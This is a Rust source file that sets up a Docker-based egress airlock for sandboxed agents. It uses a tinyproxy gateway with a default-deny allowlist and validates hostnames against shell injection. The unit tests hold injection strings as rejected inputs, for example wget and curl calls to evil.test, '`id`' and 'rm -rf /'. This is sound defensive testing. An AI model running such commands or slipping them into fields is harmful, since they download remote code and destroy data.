//! Standing up the enforced egress airlock (ADR-083).
//!
//! ADR-082 established the topology and proved it works, but Ferric could only
//! *describe* an airlock — a caller had to create the networks and run the
//! gateway by hand. This owns that lifecycle.
//!
//! The shape, and why each part is load-bearing:
//!
//! ```text
//!   sandbox ──► [ferric-airlock-N]  (--internal: NO route out)
//!                      │
//!                   gateway  ── allowlist, default-deny
//!                      │
//!               [ferric-egress-N]   (ordinary network: the only way out)
//! ```
//!
//! The sandbox is attached **only** to the internal network, so it cannot reach
//! anything except the gateway — not by ignoring `http_proxy`, not by raw IP.
//! The gateway straddles both networks and is the sole egress path, and it
//! applies the allowlist.
//!
//! Failure is **closed**: if the gateway does not come up, `start` returns an
//! error rather than a working sandbox with an open network. And teardown is
//! RAII, so a panic between `start` and `stop` cannot leak a container that
//! still has egress.

use std::process::{Command, Stdio};
use std::sync::atomic::{AtomicU64, Ordering};
use std::time::{Duration, Instant};

use crate::sandbox::{NetworkPolicy, SandboxError, check_available};

/// The gateway image, built locally on first use and reused thereafter.
///
/// Before ADR-087 every `Airlock::start` ran `apk add tinyproxy` inside a fresh
/// alpine container — ~10 s of the ~15 s startup, paid on every web-research run.
/// Baking it into an image moves that cost to a one-off build. Built from an
/// inline Dockerfile rather than pulled, so there is **no registry dependency
/// and nothing to trust beyond `alpine:latest`**, which the sandbox already uses.
const GATEWAY_IMAGE: &str = "ferric-gateway:1";
const GATEWAY_BASE: &str = "alpine:latest";
const GATEWAY_PORT: u16 = 8888;
/// How long to wait for the gateway to accept connections. It installs
/// `tinyproxy` on first start, so this is seconds, not milliseconds.
const READY_TIMEOUT: Duration = Duration::from_secs(90);

/// A rejected allowlist entry.
#[derive(Debug, PartialEq, Eq)]
pub struct InvalidHost {
    pub host: String,
    pub reason: &'static str,
}

/// Validate one allowlist entry.
///
/// **This is a security boundary, not tidiness.** Entries are written into a
/// file by a shell command inside the gateway container, so an unvalidated entry
/// containing `;`, `$(…)`, a quote or a newline is command injection into that
/// container — the one container that by construction *has* egress. Restricting
/// to the DNS hostname charset removes the possibility rather than escaping it.
pub fn validate_host(host: &str) -> Result<(), InvalidHost> {
    let invalid = |reason| {
        Err(InvalidHost {
            host: host.to_string(),
            reason,
        })
    };
    if host.is_empty() {
        return invalid("empty");
    }
    if host.len() > 253 {
        return invalid("longer than a DNS name may be");
    }
    if !host
        .chars()
        .all(|c| c.is_ascii_alphanumeric() || c == '.' || c == '-')
    {
        return invalid("only letters, digits, '.' and '-' are allowed");
    }
    if host.starts_with('-') || host.starts_with('.') || host.ends_with('-') {
        return invalid("must not start or end with a separator");
    }
    Ok(())
}

fn dk(args: &[&str]) -> Result<String, SandboxError> {
    let out = Command::new("docker")
        .args(args)
        .stderr(Stdio::piped())
        .output()
        .map_err(|e| SandboxError::Exec(e.to_string()))?;
    if !out.status.success() {
        return Err(SandboxError::Exec(format!(
            "docker {}: {}",
            args.first().copied().unwrap_or(""),
            String::from_utf8_lossy(&out.stderr).trim()
        )));
    }
    Ok(String::from_utf8_lossy(&out.stdout).trim().to_string())
}

/// Ensure the gateway image exists, building it if not.
///
/// Idempotent and cheap on the hot path: `image inspect` is a local metadata
/// lookup, so a warm machine pays milliseconds. The tag carries a version
/// (`:1`) so a future change to the recipe cannot silently reuse a stale image.
fn ensure_gateway_image() -> Result<(), SandboxError> {
    if dk(&["image", "inspect", GATEWAY_IMAGE]).is_ok() {
        return Ok(());
    }
    let dockerfile = format!("FROM {GATEWAY_BASE}\nRUN apk add --no-cache tinyproxy\n");
    let mut child = Command::new("docker")
        .args(["build", "-t", GATEWAY_IMAGE, "-"])
        .stdin(Stdio::piped())
        .stdout(Stdio::null())
        .stderr(Stdio::piped())
        .spawn()
        .map_err(|e| SandboxError::Exec(format!("docker build: {e}")))?;
    {
        use std::io::Write;
        let stdin = child
            .stdin
            .as_mut()
            .ok_or_else(|| SandboxError::Exec("docker build: no stdin".to_string()))?;
        stdin
            .write_all(dockerfile.as_bytes())
            .map_err(|e| SandboxError::Exec(format!("docker build: {e}")))?;
    }
    let out = child
        .wait_with_output()
        .map_err(|e| SandboxError::Exec(format!("docker build: {e}")))?;
    if !out.status.success() {
        return Err(SandboxError::Exec(format!(
            "building {GATEWAY_IMAGE}: {}",
            String::from_utf8_lossy(&out.stderr).trim()
        )));
    }
    Ok(())
}

/// Best-effort teardown — never fails a caller, since it runs from `Drop`.
fn dk_quiet(args: &[&str]) {
    let _ = Command::new("docker")
        .args(args)
        .stdout(Stdio::null())
        .stderr(Stdio::null())
        .status();
}

/// A running egress airlock. Dropping it tears the whole thing down.
#[derive(Debug)]
pub struct Airlock {
    internal_network: String,
    egress_network: String,
    gateway: String,
    proxy_url: String,
}

impl Airlock {
    /// Stand up an airlock permitting egress only to `allowlist`.
    ///
    /// Every name is suffixed with a process-unique id so concurrent runs cannot
    /// collide on a shared container — two agents sharing one gateway would also
    /// be sharing one allowlist.
    pub fn start(allowlist: &[String]) -> Result<Self, SandboxError> {
        for host in allowlist {
            validate_host(host)
                .map_err(|e| SandboxError::Exec(format!("allowlist {:?}: {}", e.host, e.reason)))?;
        }
        if !check_available() {
            return Err(SandboxError::NotAvailable);
        }

        static SEQ: AtomicU64 = AtomicU64::new(0);
        let id = format!(
            "{}-{}",
            std::process::id(),
            SEQ.fetch_add(1, Ordering::Relaxed)
        );
        let internal_network = format!("ferric-airlock-{id}");
        let egress_network = format!("ferric-egress-{id}");
        let gateway = format!("ferric-gateway-{id}");

        let mut this = Self {
            internal_network,
            egress_network,
            gateway,
            proxy_url: String::new(),
        };

        // From here on, resources may exist. On failure `this` is dropped and
        // `Drop` tears them down — which is why the partially-built value is
        // held in a local rather than assembled at the end.
        let proxy_url = this.bring_up(allowlist)?;
        this.proxy_url = proxy_url;
        Ok(this)
    }

    fn bring_up(&self, allowlist: &[String]) -> Result<String, SandboxError> {
        ensure_gateway_image()?;
        dk(&["network", "create", "--internal", &self.internal_network])?;
        dk(&["network", "create", &self.egress_network])?;

        // The gateway starts on the EGRESS network only. It is attached to the
        // internal one after it is ready, so a sandbox can never reach a
        // half-configured proxy.
        let filter = allowlist.join("\\n");
        let script = format!(
            "printf '{filter}\\n' > /etc/tinyproxy/filter; \
             printf '\\nFilter \"/etc/tinyproxy/filter\"\\nFilterDefaultDeny Yes\\nAllow 0.0.0.0/0\\nPort {GATEWAY_PORT}\\n' \
               >> /etc/tinyproxy/tinyproxy.conf; \
             tinyproxy -d"
        );
        dk(&[
            "run",
            "-d",
            "--name",
            &self.gateway,
            "--network",
            &self.egress_network,
            GATEWAY_IMAGE,
            "sh",
            "-c",
            &script,
        ])?;

        self.await_ready()?;
        dk(&["network", "connect", &self.internal_network, &self.gateway])?;

        let ip = dk(&[
            "inspect",
            "-f",
            &format!(
                "{{{{(index .NetworkSettings.Networks \"{}\").IPAddress}}}}",
                self.internal_network
            ),
            &self.gateway,
        ])?;
        if ip.is_empty() {
            return Err(SandboxError::Exec(
                "gateway has no address on the internal network".to_string(),
            ));
        }
        Ok(format!("http://{ip}:{GATEWAY_PORT}"))
    }

    /// Poll until the gateway reports it is accepting connections, or give up.
    ///
    /// Deliberately not a fixed sleep: container start and `tinyproxy` init vary
    /// with machine load, and a sleep that is usually long enough is a flake
    /// generator. This matters *more* now that the image is prebuilt, not less —
    /// the startup got fast enough that a fixed sleep would look like it worked.
    fn await_ready(&self) -> Result<(), SandboxError> {
        let deadline = Instant::now() + READY_TIMEOUT;
        loop {
            if let Ok(logs) = dk(&["logs", &self.gateway])
                && logs.contains("Accepting connections")
            {
                return Ok(());
            }
            // A gateway that exited will never become ready; say so now.
            if let Ok(state) = dk(&["inspect", "-f", "{{.State.Running}}", &self.gateway])
                && state == "false"
            {
                let logs = dk(&["logs", &self.gateway]).unwrap_or_default();
                return Err(SandboxError::Exec(format!(
                    "gateway exited before becoming ready: {}",
                    logs.lines().last().unwrap_or("(no output)")
                )));
            }
            if Instant::now() >= deadline {
                return Err(SandboxError::Exec(format!(
                    "gateway did not accept connections within {}s",
                    READY_TIMEOUT.as_secs()
                )));
            }
            std::thread::sleep(Duration::from_millis(500));
        }
    }

    /// The policy to hand a sandbox run. Attaching to `internal_network` is what
    /// enforces the airlock; `proxy_url` only points cooperative clients at the
    /// gateway.
    pub fn policy(&self) -> NetworkPolicy {
        NetworkPolicy::Airlock {
            network: self.internal_network.clone(),
            proxy_url: self.proxy_url.clone(),
        }
    }

    pub fn proxy_url(&self) -> &str {
        &self.proxy_url
    }

    /// This airlock's gateway container name. Unique per instance, so a caller
    /// (or a test) can reason about *its* gateway rather than any gateway —
    /// concurrent airlocks are expected and must not be confused for each other.
    pub fn gateway_name(&self) -> &str {
        &self.gateway
    }

    /// This airlock's isolated network name.
    pub fn network_name(&self) -> &str {
        &self.internal_network
    }

    /// Remove the gateway and both networks. Idempotent.
    pub fn stop(&self) {
        dk_quiet(&["rm", "-f", &self.gateway]);
        dk_quiet(&["network", "rm", &self.internal_network]);
        dk_quiet(&["network", "rm", &self.egress_network]);
    }
}

impl Drop for Airlock {
    /// RAII teardown. Without this, a panic between `start` and an explicit
    /// `stop` would leak the one container on the machine that has egress.
    fn drop(&mut self) {
        self.stop();
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn ordinary_hostnames_are_accepted() {
        for host in [
            "example.com",
            "sub.domain.example.com",
            "a-b.co",
            "127.0.0.1",
        ] {
            assert!(validate_host(host).is_ok(), "{host} should be valid");
        }
    }

    /// The reason validation exists: these entries reach a shell inside the one
    /// container that has egress.
    #[test]
    fn shell_metacharacters_are_rejected() {
        for host in [
            "example.com; wget http://evil.test/x",
            "$(curl http://evil.test)",
            "`id`",
            "example.com\nevil.test",
            "example.com'",
            "a b",
            "*.example.com",
            "example.com|tee",
        ] {
            assert!(
                validate_host(host).is_err(),
                "{host:?} must be rejected — it would be injected into the gateway"
            );
        }
    }

    #[test]
    fn structurally_invalid_names_are_rejected() {
        assert!(validate_host("").is_err());
        assert!(validate_host("-lead.com").is_err());
        assert!(validate_host(".lead.com").is_err());
        assert!(validate_host("trail-").is_err());
        assert!(validate_host(&"a".repeat(254)).is_err());
    }

    /// A bad entry must be refused before any docker resource exists, so a
    /// rejected allowlist cannot leave a half-built airlock behind.
    #[test]
    fn a_bad_allowlist_fails_before_touching_docker() {
        let err = Airlock::start(&["evil.test; rm -rf /".to_string()])
            .expect_err("must reject the entry");
        let msg = err.to_string();
        assert!(msg.contains("allowlist"), "got: {msg}");
    }
}
